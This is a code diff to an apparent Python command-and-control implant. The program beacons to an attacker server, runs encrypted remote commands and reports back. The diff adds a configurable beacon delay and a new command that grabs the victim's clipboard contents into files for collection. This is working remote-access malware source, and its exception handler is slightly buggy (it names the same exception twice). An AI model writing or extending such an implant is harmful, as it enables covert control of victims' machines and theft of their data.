@@ -6,11 +6,12 @@ from os import chdir, getenv, uname, getcwd, mkdir, path
 
 import platform, socket, time
 from subprocess import PIPE, STDOUT, run
+from pyperclip import paste, PyperclipWindowsException, PyperclipException
 from requests import exceptions, get, post, put
 from crypt import cipher
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, \
-                ZIP_PASSWORD, FILE_SEND, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode, C2Commands
+                ZIP_PASSWORD, FILE_SEND, RESPONSE_KEY, DELAY, HEADER, PROXY, HTTPStatusCode, C2Commands
 
 
 timestamp = str(int(time.time()))
@@ -37,16 +38,21 @@ else:
     client = getenv("USER", "Unknown_User") + "@" + uname().nodename + "_" + timestamp
 encrypted_client = cipher.encrypt(client.encode()).decode() # encoder
 
+delay = DELAY
+clip_count = 0
+
 # PROXY = {"https": "proxy.some-site.com:443"}
 while True:
     try:
         response = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}', headers=HEADER, proxies=PROXY)
-        print(response)
         if response.status_code == HTTPStatusCode.NOT_FOUND.value:
             raise exceptions.RequestException
     except exceptions.RequestException as e:
         # print(e)
-        time.sleep(3)
+        time.sleep(delay)
+        continue
+    
+    if response.status_code == HTTPStatusCode.NO_CONTENT.value:
         continue
 
     cmd = cipher.decrypt(response.content).decode()
@@ -133,7 +139,7 @@ while True:
         post_to_server(f"{client} has been killed.\n")
         exit()
 
-    elif cmd.startswith(C2Commands.CLS_SLP.value): # client sleep
+    elif cmd.startswith(C2Commands.CLS_DLY.value): # client delay
         try:
             delay = float(cmd.split()[2])
             if delay < 0:
@@ -142,8 +148,17 @@ while True:
             post_to_server("You must Enter in a positive nbr for time sleeping in sec.\n")
         else:
             # post_to_server(f"{client} will sleep for {delay} seconds.\n")
-            time.sleep(delay)
-            post_to_server(f"{client} is now awake.\n")
+            post_to_server(f"{client} is now configured for a {delay} second delay when set inactive.\n")
+
+    elif cmd.startswith(C2Commands.CLS_CLP.value): # client get clipboard
+        clip_count += 1
+        with open(f"clipboard_{clip_count}.txt", "w") as file_handle:
+            try:
+                file_handle.write(paste())
+            except PyperclipException or PyperclipException:
+                post_to_server("The computer is currently locked. Can not get clipboard now.\n")
+            else:
+                post_to_server(f"clipboard_{clip_count}.txt has been saved.\n")
 
   
     print(response.status_code)
